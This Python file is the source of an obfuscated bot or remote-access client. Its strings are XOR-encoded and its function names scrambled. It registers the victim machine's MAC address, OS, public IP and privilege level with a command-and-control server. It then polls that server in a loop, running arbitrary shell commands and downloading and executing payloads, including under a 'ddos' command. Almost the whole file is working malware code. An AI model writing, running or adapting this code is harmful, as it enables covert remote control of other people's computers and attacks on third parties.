
def decrypt_string(data, key):
    result = ''.join(chr(int(x) ^ key) for x in data.split(','))
    try:
        return eval(f"f'{result}'")  # Force evaluation as an f-string
    except:
        return result
import requests
import time
import subprocess
import ctypes
import os
from getmac import get_mac_address as gma
import platform


C2_URL = decrypt_string("207,211,211,215,157,136,136,150,149,144,137,151,137,151,137,150,157,159,151,151,151,136,196,200,201,211,213,200,203,136", 167)
BOT_ID = gma()
POLLING_INTERVAL = 30
#PAYLOADS_DIR = decrypt_string(decrypt_string("", 167), 167)

def jXgMqqSd():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    return is_admin

def KkfuzZne():
    if platform.system() == decrypt_string("240,206,201,195,200,208,212", 167):
        return platform.system() + decrypt_string("135", 167) + platform.release() + decrypt_string("135", 167) + platform.version()
    elif platform.system() == decrypt_string("235,206,201,210,223", 167):
        return platform.freedesktop_os_release()[decrypt_string("233,230,234,226", 167)] + decrypt_string("135", 167) + platform.release()

print(KkfuzZne())

def KvUBiXBP():
    try:
        print(decrypt_string("252,140,250,135,245,194,192,206,212,211,194,213,206,201,192,135,197,200,211,135,238,227,157,135,220,229,232,243,248,238,227,218", 167).format(**locals()))
        info = {
            decrypt_string("202,198,196", 167): BOT_ID,
            decrypt_string("200,212", 167): KkfuzZne(),
            decrypt_string("198,213,196,207", 167): platform.architecture()[0],
            decrypt_string("206,215,248,198,195,195,213,194,212,212", 167): requests.get('https://api4.ipify.org').text,
            decrypt_string("215,213,206,209,206,203,194,192,194,212", 167): decrypt_string("198,195,202,206,201", 167) if jXgMqqSd() else decrypt_string("210,212,194,213", 167)
            
        }
        response = requests.post(C2_URL + 'register/', json=info)
        if response.status_code == 200:
            print(decrypt_string("252,140,250,135,245,194,192,206,212,211,213,198,211,206,200,201,135,212,210,196,196,194,212,212,193,210,203", 167))
        else:
            print(decrypt_string("252,138,250,135,245,194,192,206,212,211,213,198,211,206,200,201,135,193,198,206,203,194,195,157,135,220,213,194,212,215,200,201,212,194,137,212,211,198,211,210,212,248,196,200,195,194,218", 167).format(**locals()))
    except Exception as e:
        print(decrypt_string("252,138,250,135,226,213,213,200,213,135,213,194,192,206,212,211,194,213,206,201,192,135,208,206,211,207,135,228,149,157,135,220,194,218", 167).format(**locals()))


def VW2IJNML(payload_url, args):
    try:
        print(decrypt_string("252,140,250,135,227,200,208,201,203,200,198,195,206,201,192,135,215,198,222,203,200,198,195,135,193,213,200,202,135,220,215,198,222,203,200,198,195,248,210,213,203,218", 167).format(**locals()))
        response = requests.get(payload_url)
        
        if response.status_code == 200:
            payload_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.path.basename(payload_url))
            with open(payload_path, decrypt_string("208,197", 167)) as file:
                file.write(response.content)

            print(decrypt_string("252,140,250,135,247,198,222,203,200,198,195,135,195,200,208,201,203,200,198,195,194,195,135,211,200,135,220,215,198,222,203,200,198,195,248,215,198,211,207,218", 167).format(**locals()))

            if payload_path.endswith(decrypt_string("137,215,222", 167)):
                command = decrypt_string("215,222,211,207,200,201,148,135,220,215,198,222,203,200,198,195,248,215,198,211,207,218,135,220,198,213,192,212,218", 167).format(**locals())
            else:
                command = decrypt_string("220,215,198,222,203,200,198,195,248,215,198,211,207,218,135,220,198,213,192,212,218", 167).format(**locals())
                
            print(decrypt_string("252,140,250,135,226,223,194,196,210,211,206,201,192,135,215,198,222,203,200,198,195,157,135,220,196,200,202,202,198,201,195,218", 167).format(**locals()))
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            print(decrypt_string("252,140,250,135,226,223,194,196,210,211,206,200,201,135,213,194,212,210,203,211,157,251,201,220,213,194,212,210,203,211,137,195,194,196,200,195,194,143,128,210,211,193,138,159,128,142,218", 167).format(**locals()))

            return result.decode('utf-8')
        else:
            return decrypt_string("225,198,206,203,194,195,135,211,200,135,195,200,208,201,203,200,198,195,135,215,198,222,203,200,198,195,157,135,220,213,194,212,215,200,201,212,194,137,212,211,198,211,210,212,248,196,200,195,194,218", 167).format(**locals())
    except Exception as e:
        return str(e)


def rvXzKlJz():
    while True:
        try:
            print(decrypt_string("252,140,250,135,247,200,203,203,206,201,192,135,193,200,213,135,196,200,202,202,198,201,195,212,135,193,213,200,202,135,228,149,137,137,137,135,229,200,211,135,238,227,157,135,220,229,232,243,248,238,227,218", 167).format(**locals()))
            response = requests.get(C2_URL + decrypt_string("196,200,202,202,198,201,195,136", 167), params={decrypt_string("202,198,196", 167): BOT_ID}, timeout=30)
            print(response.text)
            if response.status_code == 200:
                command = response.json().get(decrypt_string("196,200,202,202,198,201,195", 167))
                payload_url = response.json().get(decrypt_string("215,198,222,203,200,198,195,248,210,213,203", 167))
                args = response.json().get(decrypt_string("198,213,192,212", 167))

                if command:
                    print(decrypt_string("252,140,250,135,245,194,196,194,206,209,194,195,135,196,200,202,202,198,201,195,157,135,220,196,200,202,202,198,201,195,218", 167).format(**locals()))
                    
                    if command == decrypt_string("195,195,200,212", 167):
                        if payload_url:
                            result = VW2IJNML(payload_url, args if args else decrypt_string(decrypt_string("", 167), 167))
                        else:
                            result = decrypt_string("238,201,209,198,203,206,195,135,215,198,222,203,200,198,195,135,195,194,211,198,206,203,212", 167)
                    elif command == decrypt_string("212,207,194,203,203", 167):
                        result = IUugZg55(args)
                    else:
                        result = decrypt_string("242,201,204,201,200,208,201,135,196,200,202,202,198,201,195,157,135,220,196,200,202,202,198,201,195,218", 167).format(**locals())
                    if result:
                        requests.post(C2_URL + decrypt_string("213,194,212,210,203,211,136", 167), json={decrypt_string("202,198,196", 167): BOT_ID})
                else:
                    print(decrypt_string("252,140,250,135,233,200,135,196,200,202,202,198,201,195,135,213,194,196,194,206,209,194,195", 167))

            else:
                print(decrypt_string("252,138,250,135,225,198,206,203,194,195,135,211,200,135,215,200,203,203,157,135,220,213,194,212,215,200,201,212,194,137,212,211,198,211,210,212,248,196,200,195,194,218", 167).format(**locals()))
                time.sleep(30)
        
        except requests.exceptions.Timeout:
            print(decrypt_string("252,140,250,135,247,200,203,203,206,201,192,135,211,206,202,194,195,135,200,210,211,139,135,213,194,211,213,222,206,201,192,137,137,137", 167))
            time.sleep(POLLING_INTERVAL)
        except Exception as e:
            print(decrypt_string("252,138,250,135,226,213,213,200,213,135,215,200,203,203,206,201,192,135,193,200,213,135,196,200,202,202,198,201,195,212,157,135,220,194,218", 167).format(**locals()))
            time.sleep(POLLING_INTERVAL)


def IUugZg55(command):
    try:
        print(decrypt_string("252,140,250,135,226,223,194,196,210,211,206,201,192,135,196,200,202,202,198,201,195,157,135,220,196,200,202,202,198,201,195,218", 167).format(**locals()))
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return decrypt_string("228,200,202,202,198,201,195,135,193,198,206,203,194,195,157,135,220,194,137,200,210,211,215,210,211,137,195,194,196,200,195,194,143,128,210,211,193,138,159,128,142,218", 167).format(**locals())
    except Exception as e:
        return str(e)


if __name__ == decrypt_string("248,248,202,198,206,201,248,248", 167):
    KvUBiXBP()
    rvXzKlJz()
